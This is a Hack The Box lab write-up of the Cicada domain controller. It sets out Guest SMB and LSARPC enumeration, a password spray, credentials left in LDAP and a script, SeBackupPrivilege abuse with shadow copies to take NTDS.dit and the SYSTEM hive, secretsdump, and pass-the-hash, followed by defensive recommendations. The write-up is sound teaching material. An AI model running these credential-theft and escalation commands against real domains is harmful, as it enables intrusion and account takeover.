# Cicada - Hack The Box Write-Up

## Machine Information

| Field | Value |
| --- | --- |
| Machine | Cicada |
| Platform | Hack The Box |
| Operating system | Windows Server 2022 |
| Difficulty | Easy |
| Status | Retired |
| Domain | `cicada.htb` |
| Domain controller | `CICADA-DC.cicada.htb` |
| Primary services | DNS, Kerberos, LDAP, SMB, WinRM |
| Main techniques | Guest SMB enumeration, RID cycling, password spraying, credential discovery, WinRM, `SeBackupPrivilege`, offline NTDS extraction, pass-the-hash |

## Executive Summary

Guest access exposed an HR share containing a default onboarding password. The domain's usernames were enumerated through the LSARPC interface, and a controlled password spray showed that `michael.wrightson` had not changed the default credential.

Authenticated LDAP enumeration then revealed another password inside `david.orelious`'s account description. David could read the DEV share, where a PowerShell backup script contained plaintext credentials for `emily.oscars`. Emily was permitted to connect through WinRM and held `SeBackupPrivilege` and `SeRestorePrivilege`.

A Volume Shadow Copy snapshot provided a stable copy of the otherwise locked `NTDS.dit` database. The backup privilege was used to copy both `NTDS.dit` and the SYSTEM registry hive from the snapshot. Impacket extracted the Administrator NT hash from these files, and pass-the-hash authentication produced a final WinRM session as the domain Administrator.

```mermaid
flowchart LR
    A["Guest reads HR share"] --> B["Recover onboarding password"]
    B --> C["Enumerate usernames through LSARPC"]
    C --> D["Spray one password"]
    D --> E["Authenticate as Michael"]
    E --> F["Read David's password from LDAP"]
    F --> G["Read Emily's password from DEV script"]
    G --> H["WinRM as Emily"]
    H --> I["Abuse SeBackupPrivilege"]
    I --> J["Copy NTDS.dit and SYSTEM"]
    J --> K["Extract Administrator NT hash"]
    K --> L["Pass-the-hash WinRM"]
```



## Conventions

The following placeholders replace changing lab values and reusable secrets:

| Placeholder | Meaning |
| --- | --- |
| `<TARGET_IP>` | Current lab address of CICADA-DC |
| `<ONBOARDING_PASSWORD>` | Default password recovered from the HR notice |
| `<DAVID_PASSWORD>` | Password exposed in David's LDAP description |
| `<EMILY_PASSWORD>` | Password embedded in the backup script |
| `<LOCAL_TOOL_PATH>` | Local directory containing the SeBackupPrivilege DLLs |
| `<ADMINISTRATOR_NT_HASH>` | Administrator NT hash extracted from `NTDS.dit` |
| `<REDACTED_LM_HASH>` | Unnecessary LM hash field omitted from the public report |

No user or Administrator flag values are included.

## Reconnaissance

### Port Discovery

The successful full TCP scan exposed the standard services of an Active Directory domain controller:

```bash
nmap -p- -sC -sV --min-rate 10000 -Pn <TARGET_IP> -oN nmap/scan-all-ports
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

LDAP and the TLS certificate identified the domain and hostname:

```text
Domain:   cicada.htb
Hostname: CICADA-DC.cicada.htb
OS:       Windows Server 2022 Build 20348
```

The names were mapped locally for tools that required hostname resolution:

```bash
echo '<TARGET_IP> cicada.htb CICADA-DC.cicada.htb' | sudo tee -a /etc/hosts
```

## SMB Enumeration

### Guest Access to the HR Share

The Guest account could enumerate the server's SMB shares:

```bash
nxc smb <TARGET_IP> -u guest -p '' --shares
```

```text
Share     Permissions
--------  -----------
HR        READ
IPC$      READ
DEV
NETLOGON
SYSVOL
```

Only the HR share was directly readable with Guest credentials. It contained a single onboarding document:

```bash
smbclient //<TARGET_IP>/HR -U 'guest%'
```

```text
smb: \> dir
  Notice from HR.txt                  A     1266
smb: \> get "Notice from HR.txt"
```

The notice welcomed new employees and disclosed the organization's default password:

```text
Dear new hire!

Your default password is: <ONBOARDING_PASSWORD>

As part of our security protocols, it is essential that you change your
default password to something unique and secure.
```

Publishing a shared initial password created a risk that any account which had not completed onboarding would remain accessible with the same credential.

### Enumerating Domain Users Through LSARPC

Guest access also allowed SID lookup through the `lsarpc` named pipe:

```bash
impacket-lookupsid 'cicada.htb/guest@<TARGET_IP>'
```

`lookupsid` discovered the domain SID and tested relative identifiers to resolve security principals. This produced a useful list of domain users without requiring an authenticated LDAP query:

```text
500:  CICADA\Administrator
501:  CICADA\Guest
1000: CICADA\CICADA-DC$
1104: CICADA\john.smoulder
1105: CICADA\sarah.dantelia
1106: CICADA\michael.wrightson
1108: CICADA\david.orelious
1601: CICADA\emily.oscars
```

The human usernames were saved for credential testing:

```text
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

## Initial Access

### Password Spraying the Onboarding Credential

The single recovered password was tested once against each enumerated user. This is a password spray: one likely password across several accounts, rather than many guesses against one account.

```bash
nxc smb <TARGET_IP> \
  -u usernames.txt \
  -p '<ONBOARDING_PASSWORD>' \
  --continue-on-success
```

```text
[-] cicada.htb\john.smoulder:<ONBOARDING_PASSWORD> STATUS_LOGON_FAILURE
[-] cicada.htb\sarah.dantelia:<ONBOARDING_PASSWORD> STATUS_LOGON_FAILURE
[+] cicada.htb\michael.wrightson:<ONBOARDING_PASSWORD>
[-] cicada.htb\david.orelious:<ONBOARDING_PASSWORD> STATUS_LOGON_FAILURE
[-] cicada.htb\emily.oscars:<ONBOARDING_PASSWORD> STATUS_LOGON_FAILURE
```

`michael.wrightson` had not changed the onboarding password, providing the first authenticated domain account.

### Password in an LDAP Description

Michael's credentials enabled LDAP user enumeration:

```bash
nxc ldap <TARGET_IP> \
  -u michael.wrightson \
  -p '<ONBOARDING_PASSWORD>' \
  --users
```

The `description` attribute of `david.orelious` contained another plaintext password:

```text
Username:    david.orelious
Description: Just in case I forget my password is <DAVID_PASSWORD>
```

LDAP description fields are readable directory metadata, not protected secret storage. Any domain principal allowed to enumerate users could recover this value.

David's password authenticated successfully and revealed read access to the DEV share:

```bash
nxc smb <TARGET_IP> \
  -u david.orelious \
  -p '<DAVID_PASSWORD>' \
  --shares
```

```text
Share  Permissions
-----  -----------
DEV    READ
HR     READ
IPC$   READ
```

### Credentials in the Development Share

The DEV share contained a PowerShell backup script:

```bash
smbclient //<TARGET_IP>/DEV -U 'david.orelious%<DAVID_PASSWORD>'
```

```text
smb: \> dir
  Backup_script.ps1                  A      601
smb: \> get Backup_script.ps1
```

The script constructed a `PSCredential` object from a hard-coded plaintext password:

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "<EMILY_PASSWORD>" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
```

The recovered credential allowed a WinRM session as Emily:

```bash
evil-winrm -i <TARGET_IP> -u emily.oscars -p '<EMILY_PASSWORD>'
```

## Privilege Escalation

### Identifying Backup Privileges

Emily's access token contained several enabled rights:

```powershell
whoami /priv
```

```text
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`SeBackupPrivilege` allows a process using backup semantics to read files while bypassing their normal discretionary ACLs. On a domain controller, this becomes especially dangerous because the Active Directory database contains the domain's credential material.

### Loading the SeBackupPrivilege Cmdlets

The SeBackupPrivilege project provides PowerShell-compatible DLLs that expose file-copy operations using backup semantics. Both modules were uploaded through the existing Evil-WinRM session:

```text
upload <LOCAL_TOOL_PATH>/SeBackupPrivilegeUtils.dll
upload <LOCAL_TOOL_PATH>/SeBackupPrivilegeCmdLets.dll
```

They were then imported into the PowerShell process:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### Creating a Volume Shadow Copy

`NTDS.dit` is held open by Active Directory Domain Services and cannot be copied directly during normal operation. DiskShadow was used to create a point-in-time snapshot of the `C:` volume:

```powershell
[System.IO.File]::WriteAllLines("C:\Users\Public\Temp\script.txt", @(
    "set context persistent"
    "add volume C: alias cdrive"
    "create"
))

diskshadow.exe /s C:\Users\Public\Temp\script.txt
```

```text
Alias cdrive for shadow ID {...} set as environment variable.
Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
Original volume name: C:\
Attributes: No_Auto_Release Persistent Differential
```

The snapshot exposed a stable copy of the directory database. `Copy-FileSeBackupPrivilege` then copied `NTDS.dit` and the SYSTEM registry hive into a writable staging directory:

```powershell
Copy-FileSeBackupPrivilege \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Users\Public\Temp\ntds.dit

Copy-FileSeBackupPrivilege \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Users\Public\Temp\SYSTEM.bak
```

```text
Mode          Length Name
----          ------ ----
-a----      16777216 ntds.dit
-a----      18874368 SYSTEM.bak
```

Both files were downloaded through Evil-WinRM:

```text
download ntds.dit
download SYSTEM.bak
```

The two files serve different purposes:

- `NTDS.dit` contains the Active Directory database, including encrypted password hashes.
- The SYSTEM hive contains the boot-key material required to decrypt the relevant secrets from that database.

### Offline Credential Extraction

Impacket processed the two files locally:

```bash
impacket-secretsdump -system SYSTEM.bak -ntds ntds.dit LOCAL
```

```text
Administrator:500:<REDACTED_LM_HASH>:<ADMINISTRATOR_NT_HASH>:::
```

Because this extraction operated on downloaded copies, it did not require DCSync privileges or a live privileged LDAP session. The recovered NT hash could be presented directly through NTLM authentication:

```bash
evil-winrm -i <TARGET_IP> \
  -u Administrator \
  -H '<ADMINISTRATOR_NT_HASH>'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
```

This completed the compromise of the domain controller as the domain Administrator account.

## Security Observations

| Observation | Impact | Recommended control |
| --- | --- | --- |
| Guest could read the HR share | An unauthenticated user obtained internal onboarding material | Disable Guest access and require authenticated, least-privileged access to employee shares |
| A shared default password was stored in the onboarding notice | Any account that had not changed it was vulnerable to password spraying | Issue unique temporary credentials, require change at first logon, and expire unused onboarding accounts quickly |
| Guest could enumerate domain SIDs | An unauthenticated user built a reliable username list | Restrict anonymous and Guest access to SAMR/LSARPC where operationally possible and monitor RID-cycling behavior |
| A password was stored in an LDAP description | Any user with directory-read access could recover David's credential | Never store secrets in directory attributes; audit account descriptions and other broadly readable metadata |
| The DEV share contained a plaintext credential | David's low-privileged access exposed Emily's more powerful account | Remove credentials from scripts and use gMSAs, managed identities, or an approved secrets platform |
| Emily could access WinRM with `SeBackupPrivilege` | Her account could bypass file ACLs and retrieve domain credential material | Restrict Backup Operators membership, deny unnecessary remote logon, and monitor use of backup privileges on domain controllers |
| Backup privileges exposed `NTDS.dit` and the SYSTEM hive | Offline extraction disclosed the Administrator NT hash | Treat backup rights on a domain controller as equivalent to highly privileged access and protect backup artifacts accordingly |
| WinRM accepted NTLM pass-the-hash authentication | The recovered hash immediately provided an Administrator shell | Restrict WinRM exposure, apply administrative tiering, use protected management hosts, and reduce NTLM usage |

## Key Lessons

1. A single shared onboarding password can become an initial foothold when one user fails to rotate it.
2. Guest access can expose more than files; RPC-based SID enumeration can provide the usernames needed for targeted authentication testing.
3. LDAP attributes and automation scripts are common sources of credentials because their contents are often broadly readable.
4. `ConvertTo-SecureString` does not protect a password that is still written in plaintext inside a script.
5. `SeBackupPrivilege` can bypass file ACLs, but a Volume Shadow Copy is still needed to obtain a consistent copy of a live and locked `NTDS.dit` database.
6. `NTDS.dit` and the SYSTEM hive must be collected together because the registry hive supplies key material needed for offline decryption.
7. Backup rights on a domain controller can lead directly to domain compromise even without membership in Domain Admins.

## References

- [Hack The Box: Cicada machine profile](https://www.hackthebox.com/machines/cicada)
- [Microsoft Learn: Back up files and directories security policy setting](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories)
- [Microsoft Learn: Volume Shadow Copy Service](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
- [Giuliano108: SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
- [Fortra: Impacket](https://github.com/fortra/impacket)
- [Hackplayers: Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
